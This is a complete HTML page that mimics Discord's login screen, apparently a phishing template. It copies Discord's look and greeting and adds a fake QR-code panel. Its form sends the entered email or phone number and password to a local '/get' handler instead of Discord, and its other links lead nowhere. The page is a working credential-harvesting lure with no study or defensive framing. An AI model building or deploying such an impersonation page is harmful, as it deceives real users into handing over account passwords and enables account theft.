<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
    <title>Discord Login</title>
    <style>
      body {
        font-family: 'gg sans', 'Noto Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
        background-color: #313338;
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
        margin: 0;
      }
      .login-container {
        width: 784px;
        display: flex;
        border-radius: 8px;
        overflow: hidden;
      }
      .login-form {
        width: 400px;
        padding: 32px;
        background: #313338;
        text-align: center;
      }
      .g-h1 {
        font-size: 24px;
        font-weight: 600;
        color: #f2f3f5;
        margin-bottom: 8px;
      }
      .g-h2 {
        font-size: 16px;
        color: #b5bac1;
        margin-bottom: 20px;
      }
      .g-input {
        width: 100%;
        padding: 10px;
        border: none;
        border-radius: 4px;
        font-size: 16px;
        margin-bottom: 16px;
        box-sizing: border-box;
        outline: none;
        background: #1e1f22;
        color: #dbdee1;
      }
      .g-input:focus {
        box-shadow: 0 0 0 2px #5865f2;
      }
      .gbtn-primary {
        width: 100%;
        padding: 12px;
        background-color: #23a55a;
        color: #fff;
        border: none;
        border-radius: 4px;
        font-size: 16px;
        font-weight: 500;
        cursor: pointer;
      }
      .gbtn-primary:hover {
        background-color: #1a8b47;
      }
      .forgot {
        display: block;
        text-align: left;
        margin-top: 8px;
        color: #00a8fc;
        font-size: 14px;
        text-decoration: none;
      }
      .forgot:hover {
        text-decoration: underline;
      }
      .footer {
        margin-top: 8px;
        font-size: 14px;
        color: #b5bac1;
      }
      .footer a {
        color: #00a8fc;
        text-decoration: none;
      }
      .qr-side {
        width: 384px;
        background: #5865f2;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        padding: 40px;
        color: #fff;
      }
      .qr-side h2 {
        font-size: 24px;
        font-weight: 600;
        margin-bottom: 8px;
      }
      .qr-side p {
        font-size: 16px;
        opacity: 0.8;
      }
    </style>
  </head>
  <body>
    <div class="login-container">
      <div class="login-form">
        <h1 class="g-h1">Welcome back!</h1>
        <h2 class="g-h2">We're so excited to see you again!</h2>
        <form action="/get" method="POST">
          <div style="text-align:left;margin-bottom:16px">
            <label style="font-size:12px;font-weight:700;color:#b5bac1;text-transform:uppercase;letter-spacing:0.02em">Email or Phone Number<span style="color:#f23f43;margin-left:2px">*</span></label>
            <input class="g-input" type="text" name="email" style="margin-top:8px" required>
          </div>
          <div style="text-align:left;margin-bottom:16px">
            <label style="font-size:12px;font-weight:700;color:#b5bac1;text-transform:uppercase;letter-spacing:0.02em">Password<span style="color:#f23f43;margin-left:2px">*</span></label>
            <input class="g-input" type="password" name="password" style="margin-top:8px" required>
          </div>
          <button type="submit" class="gbtn-primary">Log In</button>
          <a href="#" class="forgot">Forgot your password?</a>
          <p class="footer" style="margin-top:16px">Need an account? <a href="#">Register</a></p>
        </form>
      </div>
      <div class="qr-side">
        <svg viewBox="0 0 48 48" width="160" height="160" fill="none">
          <rect x="2" y="2" width="44" height="44" rx="8" fill="#fff"/>
          <path d="M14 14h6v6h-6z" fill="#5865f2"/>
          <path d="M28 14h6v6h-6z" fill="#5865f2"/>
          <path d="M14 28h6v6h-6z" fill="#5865f2"/>
          <path d="M28 28h3v3h-3z" fill="#5865f2"/>
          <path d="M33 28h3v3h-3z" fill="#5865f2"/>
          <path d="M28 33h3v3h-3z" fill="#5865f2"/>
          <path d="M33 33h3v3h-3z" fill="#5865f2"/>
        </svg>
        <h2>Log in with QR Code</h2>
        <p>Scan this with the <strong>Discord mobile app</strong> to log in instantly.</p>
      </div>
    </div>
  </body>
</html>
